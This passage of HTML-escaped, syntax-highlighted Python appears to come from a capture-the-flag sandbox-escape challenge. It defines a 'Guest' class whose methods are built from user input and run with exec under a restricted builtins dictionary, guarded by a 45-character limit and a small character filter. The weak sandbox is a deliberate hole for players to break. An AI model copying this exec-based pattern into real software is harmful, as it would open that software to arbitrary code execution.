oct,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ord\u0026#39;\u003c/span\u003e : ord,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;pow\u0026#39;\u003c/span\u003e : pow,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;print\u0026#39;\u003c/span\u003e : print,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;range\u0026#39;\u003c/span\u003e : range,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;reversed\u0026#39;\u003c/span\u003e : reversed,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;round\u0026#39;\u003c/span\u003e : round,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;set\u0026#39;\u003c/span\u003e : set,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;slice\u0026#39;\u003c/span\u003e : slice,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;sorted\u0026#39;\u003c/span\u003e : sorted,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;str\u0026#39;\u003c/span\u003e : str,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;sum\u0026#39;\u003c/span\u003e : sum,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;tuple\u0026#39;\u003c/span\u003e : tuple,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;type\u0026#39;\u003c/span\u003e : type,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;vars\u0026#39;\u003c/span\u003e : secure_vars,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;zip\u0026#39;\u003c/span\u003e : zip,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;__builtins__\u0026#39;\u003c/span\u003e:\u003cspan style=\"color:#66d9ef\"\u003eNone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecreateMethod\u003c/span\u003e(code):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e len(code) \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e45\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Too long!! Bad Guy!!\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39; _$#@~\u0026#39;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        code \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e code\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ereplace(x,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ewrapper\u003c/span\u003e(self):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        exec(code, safe_dict, {\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;self\u0026#39;\u003c/span\u003e : self})\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e wrapper\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esetName\u003c/span\u003e(pattern):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        name \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e input(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Give me your \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003epattern\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e name :\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (name\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eisalpha()):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Illegal Name...\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esetAttribute\u003c/span\u003e(cls):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    attrName \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e setName(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;attribute\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        attrValue \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e input(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Give me your value:\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (attrValue\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eisalnum()):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Illegal value...\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    setattr(cls, attrName, attrValue)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esetMethod\u003c/span\u003e(cls):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    methodName \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e setName(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;method\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    code \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e input(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Give me your function:\u0026#39;\u003c/span\u003e)       \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    func \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e createMethod(code)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    setattr(cls, methodName, func)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003egetAttribute\u003c/span\u003e(obj):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    attrs \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [attr \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e attr \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e dir(obj) \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003enot\u003c/span\u003e callable(getattr(obj, attr)) \u003cspan style=\"color:#f92672\"\u003eand\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003enot\u003c/span\u003e attr\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estartswith(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;__\u0026#34;\u003c/span\u003e)]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    x \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e input(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Please enter the attribute\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003es name :\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003enot\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e attrs:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;You can\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003et access the attribute \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003ex\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003ex\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e: \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003egetattr(obj, x)\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eexcept\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Something went wrong in your attribute...\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecallMethod\u003c/span\u003e(cls, obj):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    attrs \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [attr \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e attr \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e dir(obj) \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e callable(getattr(obj, attr)) \u003cspan style=\"color:#f92672\"\u003eand\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003enot\u003c/span\u003e attr\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estartswith(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;__\u0026#34;\u003c/span\u003e)]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    x \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e input(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Please enter the method\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003es name :\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003enot\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e attrs:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;You can\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003et access the method \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003ex\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;calling method \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003ex\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e...\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            cls\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e__dict__[x](obj)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;done\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eexcept\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Something went wrong in your method...\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eclass\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eGuest\u003c/span\u003e(metaclass \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e BalsnMetaClass):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003epass\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e __name__ \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;__main__\u0026#39;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Welcome!!We have prepared a class named \u0026#34;Guest\u0026#34; for you\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    cnt \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e cnt \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        cnt \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;1. Add attribute\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;2. Add method\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;3. Finish\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        x \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e input(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Option ? :\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            setAttribute(Guest)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            setMethod(Guest)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;3\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;invalid input.\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            cnt \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Well Done! We Create an instance for you !\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    obj \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Guest()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    cnt \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e cnt \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        cnt \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;1. Inspect attribute\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;2. Using method\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;3. Exit\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        x \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e input(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Option ? :\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            getAttribute(obj)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            callMethod(Guest, obj)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;3\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan 